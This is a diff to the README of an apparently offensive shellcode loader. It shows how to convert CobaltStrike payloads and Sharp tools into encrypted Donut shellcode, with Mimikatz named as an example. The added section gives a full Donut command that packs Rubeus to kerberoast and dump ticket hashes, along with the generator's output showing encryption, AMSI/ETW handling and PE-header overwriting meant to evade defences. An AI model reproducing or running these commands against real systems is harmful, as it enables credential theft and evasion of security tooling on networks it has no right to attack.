@@ -79,8 +79,9 @@ For CobaltStrike:
 ### Move the cobaltstrike.bin to folder input and rename to cobaltstrike.bin, then run the autogen script.
 ```
 
-For any sharp tools, thanks to the cool tool [Donut](https://github.com/TheWover/donut/releases), we can convert any sharp EXE file into raw shellcode then used into this loader:
+For any sharp tools, thanks to TheWover's cool tool [Donut](https://github.com/TheWover/donut), we can convert any Sharp EXE file into raw shellcode then used into this loader:
 
+Such as Mimikatz:
 ```
 ### To Generate shellcode from the EXE using donut:
 ┌──(root㉿average-student)-[/opt/donut_v0.9.3]
@@ -98,6 +99,26 @@ For any sharp tools, thanks to the cool tool [Donut](https://github.com/TheWover
   [ AMSI/WDLP     : none
   [ Shellcode     : "/root/myCodes/sn0wldr/input/other.bin"
                                                                                        
+```
+
+Or Rubeus:
+```
+┌──(root㉿average-student)-[/opt/donutv1]
+└─# ./donut -e 3 -a 2 -f 1 -x 1 -b 3 -p "kerberoast /simple /nowrap /consoleoutfile:C:/Windows/Tasks/rub_out.txt /outfile:C:/Windows/Tasks/krb_hashes.txt" -o /root/myCodes/sn0wldr/input/other.bin --input:/var/www/html/PowerSharpLoader/x64/Rubeus.exe 
+
+  [ Donut shellcode generator v1 (built Mar  3 2023 13:39:03)
+  [ Copyright (c) 2019-2021 TheWover, Odzhan
+
+  [ Instance type : Embedded
+  [ Module file   : "/var/www/html/PowerSharpLoader/x64/Rubeus.exe"
+  [ Entropy       : Random names + Encryption
+  [ File type     : .NET EXE
+  [ Parameters    : kerberoast /simple /nowrap /consoleoutfile:C:/Windows/Tasks/rub_out.txt /outfile:C:/Windows/Tasks/krb_hashes.txt
+  [ Target CPU    : amd64
+  [ AMSI/WDLP/ETW : continue
+  [ PE Headers    : overwrite
+  [ Shellcode     : "/root/myCodes/sn0wldr/input/other.bin"
+  [ Exit          : Thread
 
 ```
 
